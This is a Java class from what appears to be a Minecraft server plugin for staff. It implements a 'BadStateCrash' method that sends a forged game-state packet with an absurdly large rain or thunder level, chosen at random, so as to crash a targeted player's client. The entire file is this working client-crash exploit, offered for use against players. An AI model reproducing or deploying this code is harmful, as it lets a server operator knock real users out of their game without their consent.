package dev.xnlawa.staffhelper.crash.impl;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerChangeGameState;
import dev.xnlawa.staffhelper.crash.Crash;
import dev.xnlawa.staffhelper.crash.CrashMethod;
import dev.xnlawa.staffhelper.util.RandomUtil;
import org.bukkit.entity.Player;

public class BadStateCrash extends Crash {
    public BadStateCrash() {
        super(CrashMethod.BADSTATE);
    }

    @Override
    public void performCrash(Player player) {
        boolean isRaining = RandomUtil.nextBoolean();
        WrapperPlayServerChangeGameState packet;
        if (isRaining) {
            packet = new WrapperPlayServerChangeGameState(WrapperPlayServerChangeGameState.Reason.RAIN_LEVEL_CHANGE, RandomUtil.nextFloat(30000000, 600000000));
        }
        else {
            packet = new WrapperPlayServerChangeGameState(WrapperPlayServerChangeGameState.Reason.THUNDER_LEVEL_CHANGE, RandomUtil.nextFloat(30000000,600000000));
        }
        PacketEvents.getAPI().getPlayerManager().sendPacket(player, packet);
    }
}
